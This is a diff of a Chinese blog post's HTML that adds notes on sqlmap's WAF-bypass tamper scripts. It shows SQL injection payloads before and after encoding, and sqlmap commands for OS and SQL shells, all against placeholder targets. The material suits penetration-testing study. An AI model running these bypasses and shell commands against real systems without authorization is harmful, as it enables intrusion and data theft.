@@ -19,7 +19,7 @@
 <meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
 <meta property="og:description" content="0x00 安装git clone https://github.com/sqlmapproject/sqlmap.git 0x01 基本用法常用参数12345678910111213141516171819-dbs       //列举数据库--count -D “数据库”   //获取表中数据个数--current-db           //列举当前数据库--users --password">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-11-27T09:06:27.752Z">
+<meta property="og:updated_time" content="2018-12-04T08:51:02.988Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqlmap笔记">
 <meta name="twitter:description" content="0x00 安装git clone https://github.com/sqlmapproject/sqlmap.git 0x01 基本用法常用参数12345678910111213141516171819-dbs       //列举数据库--count -D “数据库”   //获取表中数据个数--current-db           //列举当前数据库--users --password">
@@ -225,7 +225,7 @@ ga('send', 'pageview');
         <div id="toc-article" class="toc-article">
             <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
           <strong class="toc-title">文章目录</strong>
-                 <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-安装"><span class="toc-number">1.</span> <span class="toc-text">0x00 安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本用法"><span class="toc-number">2.</span> <span class="toc-text">0x01 基本用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用参数"><span class="toc-number">2.1.</span> <span class="toc-text">常用参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进阶"><span class="toc-number">2.2.</span> <span class="toc-text">进阶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-例子"><span class="toc-number">3.</span> <span class="toc-text">0x02 例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本"><span class="toc-number">3.1.</span> <span class="toc-text">基本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie注入"><span class="toc-number">3.2.</span> <span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#表单post"><span class="toc-number">3.3.</span> <span class="toc-text">表单post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪静态注入"><span class="toc-number">3.4.</span> <span class="toc-text">伪静态注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#交互式shell"><span class="toc-number">3.5.</span> <span class="toc-text">交互式shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waf-bypass"><span class="toc-number">3.6.</span> <span class="toc-text">waf bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol>
+                 <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-安装"><span class="toc-number">1.</span> <span class="toc-text">0x00 安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本用法"><span class="toc-number">2.</span> <span class="toc-text">0x01 基本用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用参数"><span class="toc-number">2.1.</span> <span class="toc-text">常用参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进阶"><span class="toc-number">2.2.</span> <span class="toc-text">进阶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-例子"><span class="toc-number">3.</span> <span class="toc-text">0x02 例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本"><span class="toc-number">3.1.</span> <span class="toc-text">基本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie注入"><span class="toc-number">3.2.</span> <span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#表单post"><span class="toc-number">3.3.</span> <span class="toc-text">表单post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪静态注入"><span class="toc-number">3.4.</span> <span class="toc-text">伪静态注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#交互式shell"><span class="toc-number">3.5.</span> <span class="toc-text">交互式shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Tamper使用"><span class="toc-number">4.</span> <span class="toc-text">0x03 Tamper使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">4.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol>
                </div>
          <script type="text/javascript">
         function showToc(){
@@ -276,7 +276,7 @@ ga('send', 'pageview');
 <h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>简单判断伪静态<br>浏览器F12开发者工具控制台<br><code>alert(document.lastModified)</code><br>会弹出网页最后更新时间，多次刷新页面，通过时间判断出是否为静态页面</p>
 <p><code>python sqlmap.py -u &quot;http://www.xxx.com/index.php/Index/id/1*.html&quot;</code></p>
 <h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-cmd <span class="string">"ipconfig"</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-<span class="keyword">shell</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-pwn</span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --sql-<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
-<h3 id="waf-bypass"><a href="#waf-bypass" class="headerlink" title="waf bypass"></a>waf bypass</h3><p><code>python sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p>
+<h2 id="0x03-Tamper使用"><a href="#0x03-Tamper使用" class="headerlink" title="0x03 Tamper使用"></a>0x03 Tamper使用</h2><p><code>python sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p>
 <p>常见waf绕过脚本encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py</p>
 <p><strong>tamper WAF 绕过脚本列表注释</strong></p>
 <ol>
@@ -322,6 +322,250 @@ ga('send', 'pageview');
 <li>versionedmorekeywords.py 用MySQL注释包围每个关键字</li>
 <li>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</li>
 </ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖</p>
+<p><strong>ALL 表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据。</strong></p>
+<p>使用方法： </p>
+<pre><code>sqlmap.py XXXXX -tamper &quot;模块名&quot;
+</code></pre><p>各个 tamper 的作用 </p>
+<p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p>
+<p>apostrophemask.py: </p>
+<pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%EF%BC%87&quot;) if payload else payload
+</code></pre><p>将单引号 url 编码，用于过滤了单引号的情况。</p>
+<pre><code>1&apos; AND &apos;1&apos;=&apos;1  to 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>apostrophenullencode.py: </p>
+<pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%00%27&quot;) if payload else payload
+</code></pre><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p>
+<pre><code>1&apos; AND &apos;1&apos;=&apos;1 to 1�&apos; AND �&apos;1�&apos;=�&apos;1
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>appendnullbyte.py: </p>
+<pre><code>return &quot;%s%%00&quot; % payload if payload else payload
+</code></pre><p>在你构造的payload后面加一个空字符</p>
+<pre><code>1&apos; AND &apos;1&apos;=&apos;1to1&apos; AND &apos;1&apos;=&apos;1[]
+</code></pre><p><strong>适用数据库：</strong>Access</p>
+<p>base64encode.py: </p>
+<pre><code>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload
+</code></pre><p>这个看模块名也知道是 base64 编码</p>
+<pre><code>1&apos; AND &apos;1&apos;=&apos;1 toMScgQU5EICcxJz0nMQ==
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>between.py: </p>
+<p>这个代码有点长，就不贴代码了，可以自己去查看：C:\Python\SQLMap\tamper\between.py</p>
+<p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p>
+<pre><code>1 AND A &gt; Bto1 AND A NOT BETWEEN 0 AND B
+
+1 AND A = Bto1 AND A BETWEEN B AND B
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>bluecoat.py: </p>
+<p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p>
+<pre><code>union select * from users where id = 1tounion%09select * from%09users where id like 1
+</code></pre><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p>
+<p>chardoubleencode.py: </p>
+<p>用 url 编码两次你的 payload </p>
+<pre><code>select * from usersto%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>charencode.py: </p>
+<p>用 url 编码一次你的 payload</p>
+<pre><code>select * from usersto%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>charunicodeencode.py： </p>
+<p>用 unicode 编码 payload ，只编码非编码字符</p>
+<pre><code>select * from usersto\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073
+</code></pre><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p>
+<p>commalesslimit.py： </p>
+<p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p>
+<pre><code>limit 2,1tolimit 1 offset 2
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>commalessmid.py： </p>
+<p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p>
+<pre><code>mid(version(), 1, 1)tomid(version() from 1 for 1)
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>commentbeforeparentheses.py： </p>
+<pre><code>retVal = re.sub(r&quot;\b(\w+)(&quot;, &quot;\g&lt;1&gt;/**/(&quot;, retVal)
+</code></pre><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p>
+<pre><code>union select group_concat(table_name)tounion select group_concat/**/(table_name)
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>concat2concatws.py： </p>
+<pre><code>payload = payload.replace(&quot;CONCAT(&quot;, &quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;)
+</code></pre><p>用于过滤了 concat 函数的情况</p>
+<pre><code>concat(1,2)toconcat_ws(mid(char(0), 0, 0), 1, 2)
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>equaltolike.py： </p>
+<pre><code>retVal = re.sub(r&quot;\s=\s&quot;, &quot; LIKE &quot;, retVal)
+</code></pre><p>将等号用 like 代替，用于过滤了等号的情况</p>
+<pre><code>select * from users where id=1toselect * from users where id like 1
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>escapequotes.py： </p>
+<pre><code>return payload.replace(&quot;&apos;&quot;, &quot;\&apos;&quot;).replace(&apos;&quot;&apos;, &apos;\&quot;&apos;)
+</code></pre><p>将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p>
+<pre><code>1&apos; and 1=1--+to1\\&apos; and 1=1--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>greatest.py： </p>
+<p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p>
+<pre><code>1 and a&gt;bto1 and greatest(a,b+1)=a
+</code></pre><p>ALL</p>
+<p>halfversionedmorekeywords.py： </p>
+<p>在关键字前添加注释，用于过滤了关键字的情况</p>
+<pre><code>union select 1,2to/*!0union/*!0select 1,2
+</code></pre><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p>
+<p>htmlencode.py： </p>
+<pre><code>return re.sub(r&quot;[^\w]&quot;, lambda match: &quot;&amp;#%d;&quot; % ord(match.group(0)), payload) if payload else payload
+</code></pre><p>从名字就知道是将 payload 进行 html 编码</p>
+<pre><code>1&apos; and 1=1--+to&amp;#49;&amp;#39;&amp;#32;&amp;#97;&amp;#110;&amp;#100;&amp;#32;&amp;#49;&amp;#61;&amp;#49;&amp;#45;&amp;#45;&amp;#43;
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>ifnull2ifisnull.py： </p>
+<p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p>
+<pre><code>ifnull(1, 2)toif(isnull(1), 2, 1)
+</code></pre><p><strong>适用数据库：</strong>MySql</p>
+<p>informationschemacomment.py： </p>
+<pre><code>retVal = re.sub(r&quot;(?i)(information_schema).&quot;, &quot;\g&lt;1&gt;/**/.&quot;, payload)
+</code></pre><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p>
+<pre><code>select table_name from information_schema.tablestoselect table_name from information_schema/**/.tables
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>lowercase.py： </p>
+<p>将 payload 里的大写转为小写</p>
+<pre><code>UNION SELECTtounion select
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>modsecurityversioned.py： </p>
+<p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p>
+<pre><code>1 and 2&gt;1--+to1 /*!30874and 2&gt;1*/--+
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>modsecurityzeroversioned.py： </p>
+<p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p>
+<pre><code>1 and 2&gt;1--+to1 /*!00000and 2&gt;1*/--+
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>multiplespaces.py： </p>
+<p>在关键字周围添加多个空格</p>
+<pre><code>union select 1,2--+tounion         select       1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>nonrecursivereplacement.py： </p>
+<p>关键字双写，可用于关键字过滤</p>
+<pre><code>union select 1,2--+touniounionn selecselectt 1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>overlongutf8.py： </p>
+<p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p>
+<pre><code>select field from table where 2&gt;1toselect%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>percentage.py： </p>
+<p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p>
+<pre><code>select * from usersto%s%e%l%e%c%t * %f%r%o%m %u%s%e%r%s
+</code></pre><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p>
+<p>plus2concat.py： </p>
+<p>用 concat 函数来替代加号，用于加号被过滤的情况</p>
+<pre><code>select char(13)+char(114)+char(115) from usertoselect concat(char(113),char(114),char(115)) from user
+</code></pre><p><strong>适用数据库：</strong>SQL Server 2012+</p>
+<p>plus2fnconcat.py： </p>
+<p>用 fn concat 来替代加号，和上面类似</p>
+<pre><code>select char(13)+char(114)+char(115) from usertoselect {fn concat({ fn concat(char(113),char(114))},char(115))} from user
+</code></pre><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p>
+<p>randomcase.py： </p>
+<p>将 payload 随机大小写，可用于大小写绕过的情况</p>
+<pre><code>union select 1,2--+toUniOn SElect 1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>randomcomments.py： </p>
+<p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p>
+<pre><code>union select 1,2--+toun/**/ion sele/**/ct 1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>securesphere.py： </p>
+<pre><code>return payload + &quot; and &apos;0having&apos;=&apos;0having&apos;&quot; if payload else payload
+</code></pre><p>在 payload 后面加入字符串，可以自定义</p>
+<pre><code>1&apos; and 1=1to1&apos; and 1=1 &apos;0having&apos;=&apos;0having&apos;
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>sp_password.py： </p>
+<pre><code>retVal = &quot;%s%ssp_password&quot; % (payload, &quot;-- &quot; if not any(_ if _ in payload else None for _ in (&apos;#&apos;, &quot;-- &quot;)) else &quot;&quot;)
+</code></pre><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p>
+<pre><code>1’  and 1=1--+to1 and 1=1-- sp_password
+</code></pre><p><strong>适用数据库：</strong>MSSQL</p>
+<p>space2comment.py： </p>
+<p>用 /**/ 替代空格，用于空格的绕过</p>
+<pre><code>union select 1,2--+tounion/**/select/**/1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>space2dash.py： </p>
+<p>用注释符–和一个随机字符串加一个换行符替换控制符</p>
+<p>?union select 1,2–+tounion–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p>
+<p><strong>适用数据库：</strong>MSSQL、 SQLite</p>
+<p>space2hash.py： </p>
+<p>和上面类似，不过这儿是用#注释符</p>
+<pre><code>union select 1,2--+tounion%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>space2morecomment.py： </p>
+<p>将空格用 /<strong>_</strong>/ 替代</p>
+<pre><code>union select 1,2--+tounion/**_**/select/**_**/1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>space2morehash.py： </p>
+<p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p>
+<pre><code>space2hash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2--+
+
+space2morehash.py：union select 1,2--+tounion  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2--+
+</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p>
+<p>space2mssqlblank.py： </p>
+<pre><code>blanks = (&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;, &apos;%0A&apos;)
+</code></pre><p>用这些随机空白符替换 payload 中的空格</p>
+<pre><code>union select 1,2--+tounion%01select%021,2--+
+</code></pre><p><strong>适用数据库：</strong>SQL Server</p>
+<p>space2mssqlhash.py： </p>
+<p>用 # 加一个换行符替换 payload 中的空格</p>
+<pre><code>union select 1,2--+ tounion%23%0Aselect%23%0A1,2--+
+</code></pre><p><strong>适用数据库：</strong>MSSQL、MySQL</p>
+<p>space2mysqlblank.py： </p>
+<pre><code>blanks = (&apos;%09&apos;, &apos;%0A&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0B&apos;)
+</code></pre><p>用这些随机空白符替换payload中的空格</p>
+<pre><code>union select 1,2--+tounion%09select%0D1,2--+
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>space2mysqldash.py： </p>
+<p>用 – 加一个换行符替换空格</p>
+<pre><code>union select 1,2--+tounion--%0Aselect--%0A1,2--+
+</code></pre><p><strong>适用数据库：</strong>MySQL、MSSQL</p>
+<p>space2plus.py： </p>
+<p>用 + 替换空格</p>
+<pre><code>union select 1,2--+tounion+select+1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>space2randomblank.py： </p>
+<pre><code>blanks = (&quot;%09&quot;, &quot;%0A&quot;, &quot;%0C&quot;, &quot;%0D&quot;)
+</code></pre><p>用这些随机空白符替换 payload 中的空格</p>
+<pre><code>union select 1,2--+tounion%09select%0C1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>symboliclogical.py： </p>
+<pre><code>retVal = re.sub(r&quot;(?i)\bAND\b&quot;, &quot;%26%26&quot;, re.sub(r&quot;(?i)\bOR\b&quot;, &quot;%7C%7C&quot;, payload))
+</code></pre><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p>
+<pre><code>1 and 1=1to1 %26%26 1=1
+
+1 or 1=1to1 %7c%7c 1=1
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>unionalltounion.py： </p>
+<pre><code>return payload.replace(&quot;UNION ALL SELECT&quot;, &quot;UNION SELECT&quot;) if payload else payload
+</code></pre><p>用 union select 替换union all select</p>
+<pre><code>union all select 1,2--+tounion select 1,2--+
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>unmagicquotes.py： </p>
+<p>用宽字符绕过 GPC addslashes</p>
+<pre><code>1‘ and 1=1to1%df%27 and 1=1--
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>uppercase.py： </p>
+<p>将 payload 大写</p>
+<pre><code>union selecttoUNION SELECT
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>varnish.py： </p>
+<pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot;return payload
+</code></pre><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p>
+<p>还可以自定义：</p>
+<pre><code>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>versionedkeywords.py </p>
+<p>对不是函数的关键字进行注释</p>
+<pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#
+</code></pre><p>to</p>
+<pre><code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
+</code></pre><p><strong>适用数据库：</strong>MySQL</p>
+<p>versionedmorekeywords.py： </p>
+<p>注释每个关键字</p>
+<pre><code>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#
+</code></pre><p>to</p>
+<pre><code>1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/,/!CONCAT/(/!CHAR/(58,122,114,115,58),/!IFNULL/(CAST(/!CURRENT_USER/()/!AS//!CHAR/),/!CHAR/(32)),/!CHAR/(58,115,114,121,58))#
+</code></pre><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p>
+<p>xforwardedfor.py： </p>
+<pre><code>headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-Forwarded-For&quot;] = randomIP()return payload
+</code></pre><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p>
+<p><strong>适用数据库：</strong>ALL</p>
 <p><strong>自动尝试每个tamper脚本</strong><br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `<span class="keyword">ls</span> <span class="string">/usr/share/sqlmap/tamper/</span>*<span class="string">.py</span>`; do <span class="keyword">echo</span> -e <span class="string">"\e[41;1m  tamper: $t\e[0m"</span>; sqlmap -u <span class="string">"http://target.com/sql.asp?id=xx*"</span> <span class="params">--dbs</span> <span class="params">--random-agent</span> <span class="params">--smart</span> <span class="params">--batch</span> <span class="params">--tamper</span> $t <span class="params">--threads</span> 10;done;</span><br></pre></td></tr></table></figure></p>
 <p><strong>说明下 :</strong></p>
 <p>–random-agent 参数随机 random-agent  (可绕过一些检测) 当然此时也可以不要该参数<br>–smart 智能的方式<br>–batch 默认选择<br>echo -e “\e[41;1m  tamper: $t\e[0m”;  是为了 显眼的方式 显示 当前使用的 tamper 红底白字 加粗…  以方便找到合适tamper 然后停止。</p>
@@ -358,7 +602,7 @@ ga('send', 'pageview');
 <h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><p>简单判断伪静态<br>浏览器F12开发者工具控制台<br><code>alert(document.lastModified)</code><br>会弹出网页最后更新时间，多次刷新页面，通过时间判断出是否为静态页面</p>
 <p><code>python sqlmap.py -u &quot;http://www.xxx.com/index.php/Index/id/1*.html&quot;</code></p>
 <h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-cmd <span class="string">"ipconfig"</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-<span class="keyword">shell</span></span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --os-pwn</span><br><span class="line"><span class="keyword">python</span> sqlmap.<span class="keyword">py</span> -<span class="keyword">u</span> <span class="string">"http://www.xxx.com"</span> --sql-<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
-<h3 id="waf-bypass"><a href="#waf-bypass" class="headerlink" title="waf bypass"></a>waf bypass</h3><p><code>python sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p>
+<h2 id="0x03-Tamper使用"><a href="#0x03-Tamper使用" class="headerlink" title="0x03 Tamper使用"></a>0x03 Tamper使用</h2><p><code>python sqlmap.py -u &quot;http://www.xxx.com&quot; -v 3 --dbs --batch --tamper &quot;space2hash.py&quot;</code></p>
 <p>常见waf绕过脚本encoder: space2hash.py, space2morehash.py, base64encode.py, charencode.py</p>
 <p><strong>tamper WAF 绕过脚本列表注释</strong></p>
 <ol>
@@ -404,6 +648,250 @@ ga('send', 'pageview');
 <li>versionedmorekeywords.py 用MySQL注释包围每个关键字</li>
 <li>xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</li>
 </ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖</p>
+<p><strong>ALL 表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据。</strong></p>
+<p>使用方法： </p>
+<pre><code>sqlmap.py XXXXX -tamper &quot;模块名&quot;
+</code></pre><p>各个 tamper 的作用 </p>
+<p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p>
+<p>apostrophemask.py: </p>
+<pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%EF%BC%87&quot;) if payload else payload
+</code></pre><p>将单引号 url 编码，用于过滤了单引号的情况。</p>
+<pre><code>1&apos; AND &apos;1&apos;=&apos;1  to 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>apostrophenullencode.py: </p>
+<pre><code>return payload.replace(&apos;\&apos;&apos;, &quot;%00%27&quot;) if payload else payload
+</code></pre><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p>
+<pre><code>1&apos; AND &apos;1&apos;=&apos;1 to 1�&apos; AND �&apos;1�&apos;=�&apos;1
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>appendnullbyte.py: </p>
+<pre><code>return &quot;%s%%00&quot; % payload if payload else payload
+</code></pre><p>在你构造的payload后面加一个空字符</p>
+<pre><code>1&apos; AND &apos;1&apos;=&apos;1to1&apos; AND &apos;1&apos;=&apos;1[]
+</code></pre><p><strong>适用数据库：</strong>Access</p>
+<p>base64encode.py: </p>
+<pre><code>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload
+</code></pre><p>这个看模块名也知道是 base64 编码</p>
+<pre><code>1&apos; AND &apos;1&apos;=&apos;1 toMScgQU5EICcxJz0nMQ==
+</code></pre><p><strong>适用数据库：</strong>ALL</p>
+<p>between.py: </p>
+<p>这个代码有点长，就不贴代码了，可以自己去查看：C:\Python\SQLMap\tamper\between.py</p>
+<p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p>
